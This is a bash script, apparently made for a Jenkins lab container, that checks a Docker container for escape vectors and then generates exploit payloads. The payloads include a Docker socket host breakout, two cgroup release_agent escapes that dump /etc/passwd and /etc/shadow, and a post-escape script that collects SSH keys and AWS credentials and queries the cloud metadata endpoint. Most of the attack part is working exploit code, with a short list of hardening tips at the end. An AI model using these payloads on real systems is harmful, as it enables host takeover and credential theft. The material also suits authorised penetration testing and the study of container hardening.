#!/bin/bash

echo "=========================================="
echo "  CONTAINER ESCAPE TECHNIQUES"
echo "=========================================="
echo ""

CONTAINER="${1:-jenkins-lab}"
OUTPUT_DIR="/tmp/jenkins-escape-$$"
mkdir -p "$OUTPUT_DIR"

ESCAPE_VECTORS=0
ESCAPE_SUCCESS=0

echo "[+] Target Container: $CONTAINER"
echo "[+] Output Directory: $OUTPUT_DIR"
echo ""

echo "[PHASE 1] Container Environment Analysis"
echo "========================================="
echo ""

echo "[1.1] Checking container capabilities"
docker exec "$CONTAINER" capsh --print 2>/dev/null > "$OUTPUT_DIR/capabilities.txt"
if grep -q "cap_sys_admin" "$OUTPUT_DIR/capabilities.txt" 2>/dev/null; then
    echo "    ⚠ CAP_SYS_ADMIN detected - High escape potential!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
else
    echo "    ✓ No dangerous capabilities"
fi

echo "[1.2] Checking for privileged mode"
PRIVILEGED=$(docker inspect "$CONTAINER" 2>/dev/null | grep -i "Privileged" | grep "true")
if [[ -n "$PRIVILEGED" ]]; then
    echo "    ⚠ Container running in privileged mode!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
else
    echo "    ✓ Not privileged"
fi

echo "[1.3] Checking Docker socket mount"
docker exec "$CONTAINER" ls -la /var/run/docker.sock 2>/dev/null > /dev/null
if [[ $? -eq 0 ]]; then
    echo "    ⚠ Docker socket mounted - Container escape possible!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
    
    echo "    [*] Attempting Docker socket exploitation..."
    docker exec "$CONTAINER" docker ps 2>/dev/null > "$OUTPUT_DIR/host-containers.txt"
    if [[ $? -eq 0 ]]; then
        echo "        ✓ Can access host Docker daemon!"
        ESCAPE_SUCCESS=$((ESCAPE_SUCCESS + 1))
        
        cat > "$OUTPUT_DIR/docker-socket-exploit.sh" << 'EOFSCRIPT'
#!/bin/bash
# Docker Socket Container Escape Exploit
# Run a privileged container to break out
docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
EOFSCRIPT
        echo "        Exploit saved: $OUTPUT_DIR/docker-socket-exploit.sh"
    fi
else
    echo "    ✓ Docker socket not accessible"
fi

echo "[1.4] Checking cgroup mounts"
docker exec "$CONTAINER" mount | grep cgroup > "$OUTPUT_DIR/cgroup-mounts.txt" 2>/dev/null
if grep -q "cgroup" "$OUTPUT_DIR/cgroup-mounts.txt" 2>/dev/null; then
    echo "    ⚠ Cgroup mounts detected"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
fi

echo "[1.5] Checking seccomp profile"
SECCOMP=$(docker inspect "$CONTAINER" 2>/dev/null | grep -i "SeccompProfile")
if [[ "$SECCOMP" == *"unconfined"* ]]; then
    echo "    ⚠ Seccomp unconfined - More syscalls available"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
else
    echo "    ✓ Seccomp profile active"
fi

echo ""
echo "[PHASE 2] File System Analysis"
echo "==============================="
echo ""

echo "[2.1] Checking for host filesystem mounts"
docker exec "$CONTAINER" mount 2>/dev/null | grep -v "overlay\|tmpfs\|proc\|sysfs" > "$OUTPUT_DIR/suspicious-mounts.txt"
SUSPICIOUS_MOUNTS=$(wc -l < "$OUTPUT_DIR/suspicious-mounts.txt")
if [[ $SUSPICIOUS_MOUNTS -gt 0 ]]; then
    echo "    ⚠ Suspicious mounts found: $SUSPICIOUS_MOUNTS"
    cat "$OUTPUT_DIR/suspicious-mounts.txt" | while read line; do
        echo "      → $line"
    done
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + SUSPICIOUS_MOUNTS))
fi

echo "[2.2] Checking for writable host paths"
docker inspect "$CONTAINER" 2>/dev/null | grep -A 5 "Mounts" > "$OUTPUT_DIR/volume-mounts.json"
if grep -q "/home\|/root\|/etc" "$OUTPUT_DIR/volume-mounts.json" 2>/dev/null; then
    echo "    ⚠ Sensitive host paths mounted!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
fi

echo "[2.3] Checking kernel modules"
docker exec "$CONTAINER" lsmod 2>/dev/null > "$OUTPUT_DIR/kernel-modules.txt"
MODULE_COUNT=$(wc -l < "$OUTPUT_DIR/kernel-modules.txt" 2>/dev/null || echo 0)
echo "    Kernel modules visible: $MODULE_COUNT"

echo ""
echo "[PHASE 3] Process & User Context"
echo "================================="
echo ""

echo "[3.1] Checking container user"
CONTAINER_USER=$(docker exec "$CONTAINER" whoami 2>/dev/null)
echo "    Container user: $CONTAINER_USER"
if [[ "$CONTAINER_USER" == "root" ]]; then
    echo "    ⚠ Running as root inside container"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
fi

echo "[3.2] Checking sudo privileges"
docker exec "$CONTAINER" sudo -l 2>/dev/null > "$OUTPUT_DIR/sudo-privs.txt"
if grep -q "NOPASSWD" "$OUTPUT_DIR/sudo-privs.txt" 2>/dev/null; then
    echo "    ⚠ NOPASSWD sudo available!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
    cat "$OUTPUT_DIR/sudo-privs.txt" | while read line; do
        echo "      → $line"
    done
fi

echo "[3.3] Checking for SUID binaries"
docker exec "$CONTAINER" find / -perm -4000 -type f 2>/dev/null > "$OUTPUT_DIR/suid-binaries.txt"
SUID_COUNT=$(wc -l < "$OUTPUT_DIR/suid-binaries.txt")
echo "    SUID binaries found: $SUID_COUNT"
if [[ $SUID_COUNT -gt 20 ]]; then
    echo "    ⚠ Unusual number of SUID binaries"
fi

echo ""
echo "[PHASE 4] Network Analysis"
echo "=========================="
echo ""

echo "[4.1] Checking network mode"
NET_MODE=$(docker inspect "$CONTAINER" 2>/dev/null | grep -i "NetworkMode" | cut -d'"' -f4)
echo "    Network mode: $NET_MODE"
if [[ "$NET_MODE" == "host" ]]; then
    echo "    ⚠ Host network mode - Full network access!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
fi

echo "[4.2] Checking accessible network interfaces"
docker exec "$CONTAINER" ip addr 2>/dev/null > "$OUTPUT_DIR/network-interfaces.txt"
INTERFACES=$(docker exec "$CONTAINER" ip addr 2>/dev/null | grep -c "^[0-9]")
echo "    Network interfaces: $INTERFACES"

echo "[4.3] Checking for host communication"
docker exec "$CONTAINER" ping -c 1 host.docker.internal 2>/dev/null > /dev/null
if [[ $? -eq 0 ]]; then
    echo "    ⚠ Can reach Docker host!"
    ESCAPE_VECTORS=$((ESCAPE_VECTORS + 1))
fi

echo ""
echo "[PHASE 5] Exploit Techniques"
echo "============================"
echo ""

echo "[5.1] Generating exploit payloads"

# Exploit 1: Docker socket breakout
if docker exec "$CONTAINER" ls /var/run/docker.sock 2>/dev/null > /dev/null; then
    cat > "$OUTPUT_DIR/exploit-docker-socket.sh" << 'EOF'
#!/bin/bash
# Exploit: Docker Socket Breakout
docker run -v /:/hostfs --rm alpine sh -c "chroot /hostfs /bin/sh"
EOF
    chmod +x "$OUTPUT_DIR/exploit-docker-socket.sh"
    echo "    ✓ Docker socket exploit: $OUTPUT_DIR/exploit-docker-socket.sh"
fi

# Exploit 2: Privileged container escape
cat > "$OUTPUT_DIR/exploit-privileged.sh" << 'EOF'
#!/bin/bash
# Exploit: Privileged Container Escape via cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/passwd > $host_path/passwd_dump" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
EOF
chmod +x "$OUTPUT_DIR/exploit-privileged.sh"
echo "    ✓ Privileged escape exploit: $OUTPUT_DIR/exploit-privileged.sh"

# Exploit 3: Writable cgroup escape
cat > "$OUTPUT_DIR/exploit-cgroup-release-agent.sh" << 'EOF'
#!/bin/bash
# Exploit: Cgroup release_agent Escape
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w; echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts`
touch /o;
echo $t/c>$d/release_agent;
echo "#!/bin/sh">>/c
echo "cat /etc/shadow > $t/shadow" >> /c
chmod +x /c; sh -c "echo 0 > $d/w/cgroup.procs";
sleep 1; cat /shadow
EOF
chmod +x "$OUTPUT_DIR/exploit-cgroup-release-agent.sh"
echo "    ✓ Cgroup escape exploit: $OUTPUT_DIR/exploit-cgroup-release-agent.sh"

echo ""
echo "[5.2] Generating post-escape actions"

cat > "$OUTPUT_DIR/post-escape-actions.sh" << 'EOF'
#!/bin/bash
# Post-Escape Actions on Host

echo "[+] Post-Escape Enumeration"

echo "[1] Gathering host information"
uname -a > /tmp/host-info.txt
cat /etc/os-release >> /tmp/host-info.txt

echo "[2] Dumping /etc/passwd and /etc/shadow"
cat /etc/passwd > /tmp/passwd
cat /etc/shadow > /tmp/shadow 2>/dev/null

echo "[3] Listing Docker containers on host"
docker ps -a > /tmp/host-docker-ps.txt 2>/dev/null

echo "[4] Checking for SSH keys"
find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null > /tmp/ssh-keys.txt

echo "[5] Looking for AWS credentials"
find /root /home -name "credentials" -path "*/.aws/*" 2>/dev/null > /tmp/aws-creds.txt

echo "[6] Checking cloud metadata"
curl -s http://169.254.169.254/latest/meta-data/ > /tmp/cloud-metadata.txt 2>/dev/null

echo "[+] Exfiltration complete. Check /tmp/ for results"
EOF
chmod +x "$OUTPUT_DIR/post-escape-actions.sh"
echo "    ✓ Post-escape actions: $OUTPUT_DIR/post-escape-actions.sh"

echo ""
echo "[PHASE 6] Report Generation"
echo "==========================="
echo ""

cat > "$OUTPUT_DIR/ESCAPE_ANALYSIS.txt" << EOF
========================================
  CONTAINER ESCAPE ANALYSIS
========================================

Container: $CONTAINER
Timestamp: $(date)

SUMMARY
=======
Escape Vectors Identified: $ESCAPE_VECTORS
Successful Exploits: $ESCAPE_SUCCESS

VULNERABILITY ASSESSMENT
========================
$(cat "$OUTPUT_DIR/capabilities.txt" 2>/dev/null)

ESCAPE TECHNIQUES
=================
1. Docker Socket Exploitation
   Status: $(docker exec "$CONTAINER" ls /var/run/docker.sock 2>/dev/null > /dev/null && echo "POSSIBLE" || echo "N/A")
   
2. Privileged Container Escape
   Status: $(docker inspect "$CONTAINER" 2>/dev/null | grep -i "Privileged" | grep -q "true" && echo "POSSIBLE" || echo "N/A")
   
3. Cgroup Release Agent Escape
   Status: $(docker exec "$CONTAINER" mount | grep -q "cgroup" && echo "POSSIBLE" || echo "N/A")
   
4. Host Network Access
   Status: $(docker inspect "$CONTAINER" 2>/dev/null | grep -q "\"NetworkMode\": \"host\"" && echo "POSSIBLE" || echo "N/A")

EXPLOIT PAYLOADS GENERATED
==========================
$(ls -1 "$OUTPUT_DIR"/exploit-*.sh 2>/dev/null)

RECOMMENDATIONS
===============
1. Run container without privileged mode
2. Don't mount Docker socket into containers
3. Use AppArmor/SELinux profiles
4. Minimize container capabilities
5. Use read-only root filesystem
6. Implement seccomp profiles
7. Use user namespaces
8. Regular security audits

========================================
EOF

echo "    ✓ Escape analysis report generated"

echo ""
echo "=========================================="
echo "         ESCAPE ANALYSIS SUMMARY"
echo "=========================================="
echo ""
echo "🎯 Escape Vectors: $ESCAPE_VECTORS"
echo "✅ Exploitable: $ESCAPE_SUCCESS"
echo ""
echo "📁 Output Directory: $OUTPUT_DIR"
echo ""
echo "Key Files:"
echo "  - ESCAPE_ANALYSIS.txt (full report)"
echo "  - exploit-*.sh (exploit payloads)"
echo "  - post-escape-actions.sh (post-exploitation)"
echo ""

if [[ $ESCAPE_VECTORS -gt 0 ]]; then
    echo "⚠️  WARNING: Container escape is possible!"
    echo ""
    echo "Test exploits:"
    for exploit in "$OUTPUT_DIR"/exploit-*.sh; do
        [[ -f "$exploit" ]] && echo "  bash $exploit"
    done
else
    echo "✅ Container appears well-configured against escape"
fi
echo ""
